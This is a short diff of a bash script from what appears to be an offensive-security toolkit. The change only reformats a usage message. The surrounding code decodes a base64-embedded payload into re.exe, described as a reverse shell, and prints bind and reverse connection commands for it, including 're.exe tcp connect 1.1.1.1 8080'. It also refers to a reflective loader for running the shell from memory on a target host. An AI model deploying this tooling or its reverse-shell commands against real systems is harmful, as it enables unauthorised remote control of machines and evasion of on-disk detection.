@@ -1019,7 +1019,10 @@ case $1 in
         "")
             echo -n $sharpOffensiveShell | base64 -d > $PWD/re.exe
             echo "Saving $1 simple-revshell: $PWD/re.exe"
-            yellowprint "Usage: \n Bind:re.exe tcp listen 0.0.0.0 8080\nReverse: re.exe tcp connect 1.1.1.1 8080\n\nOr load it and execute it from memory on host, by using loader in main menu: Reflective SharpOffensiveShell"
+            yellowprint "Usage:" 
+            yellowprint "Bind: re.exe tcp listen 0.0.0.0 8080"
+            yellowprint "Reverse: re.exe tcp connect 1.1.1.1 8080"
+            yellowprint "Or load it and execute it from memory on host, by using loader in main menu: 15) Reflective SharpOffensiveShell"
             echo
             read -p "Press enter to go back to the main menu"
             mainmenu
@@ -1027,7 +1030,10 @@ case $1 in
         *)
             echo -n $sharpOffensiveShell | base64 -d > $ans/re.exe
             echo "Saving $1 simple-revshell: $ans/re.exe"
-            yellowprint "Usage: \n Bind:re.exe tcp listen 0.0.0.0 8080\nReverse: re.exe tcp connect 1.1.1.1 8080\n\nOr load it and execute it from memory on host, by using loader in main menu: Reflective SharpOffensiveShell"
+            yellowprint "Usage:" 
+            yellowprint "Bind: re.exe tcp listen 0.0.0.0 8080"
+            yellowprint "Reverse: re.exe tcp connect 1.1.1.1 8080"
+            yellowprint "Or load it and execute it from memory on host, by using loader in main menu: 15) Reflective SharpOffensiveShell"
             echo
             read -p "Press enter to go back to the main menu"
             mainmenu
